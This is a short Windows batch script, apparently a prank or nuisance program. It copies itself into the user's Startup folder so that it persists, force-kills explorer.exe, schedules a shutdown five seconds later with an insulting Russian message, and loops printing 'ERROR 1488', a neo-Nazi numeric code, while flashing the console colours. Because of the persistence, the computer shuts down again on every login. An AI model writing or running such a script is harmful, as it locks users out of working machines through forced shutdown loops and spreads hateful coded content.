@echo off
chcp 65001 > nul

echo %date% %time% >> "%userprofile%\Documents\CNC_project\log.txt"

copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

taskkill /f /im explorer.exe

shutdown.exe -s -t 05 -c "ну ты ваще дебил"
:loop
echo ERROR 1488
color 47
echo ERROR 1488
color 74

goto loop
pause
